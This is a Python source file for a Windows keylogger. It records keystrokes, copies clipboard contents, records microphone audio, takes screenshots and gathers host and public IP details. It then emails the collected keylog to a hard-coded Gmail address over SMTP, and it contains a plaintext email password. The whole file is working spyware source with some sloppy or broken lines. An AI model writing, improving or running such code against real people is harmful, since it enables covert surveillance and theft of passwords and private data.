# libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard.txt"
audio_recordings = "audio.wav"
screenshot_image = "screenshot.png"

email_address = "cyberlove2002@gmail.com"
password = "CyberSecurityLove!@#$%^&*()1234567890"
to_address = "cyberlove2002@gmail.com"

file_path = "K:\\Programs\\Keylogger\\Project\\Informations"
image_path = "K:\\Programs\\Keylogger\\Project\\Images"
audio_file_path = "K:\\Programs\\Keylogger\\Project\\Recordings"
extension = "\\"

sound_recording_time = 10


def send_email(keys_information, attachment_path, to_address):
    # Create the MIME object
    message = MIMEMultipart()

    # Attach the body of the email
    message.attach(MIMEText(keys_information, 'plain'))

    # Attach the file
    with open(attachment_path, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())

    # Encode the attachment
    encoders.encode_base64(part)

    # Add the attachment to the message
    part.add_header('Content-Disposition', f'attachment; filename= {attachment_path}')
    message.attach(part)  # Move this line inside the 'with' block

    # Rest of your email-sending code...

    # Set up your email server
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()

    # Login to your email account
    server.login('cyberlove2002@gmail.com', ' ')

    # Send the email
    server.sendmail('cyberlove2002@gmail.com', to_address, message.as_string())

    # Quit the server
    server.quit()


send_email(keys_information, file_path + extension + keys_information, to_address)


def computer_information():
    with open(file_path + extension + system_information, "a") as f:
        host_name = socket.gethostname()
        ip_address = socket.gethostbyname(host_name)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public Ip Address: " + public_ip + '\n')

        except Exception:
            f.write("Couldn't get public Ip address \n")

        f.write("Processor: " + platform.processor() + '\n')
        f.write("System Information: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + host_name + '\n')


computer_information()


def get_clipboard_information():
    with open(file_path + extension + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            clipboard_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data \n" + clipboard_data)

        except:
            f.write("Clipboard can not be accessed \n")


get_clipboard_information()


def record_audio():
    fs = 44100
    seconds = sound_recording_time

    audio_recording = sd.rec(int(seconds * fs), samplerate=fs,channels=2)
    sd.wait()

    write(audio_file_path + extension + audio_recordings, fs, audio_recording)


record_audio()


def screenshot():
    ss = ImageGrab.grab()
    ss.save(image_path + extension + screenshot_image)
count = 0

keys = []


def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extension + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("spcace") > 0:
                f.write("\n")
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join(

    )
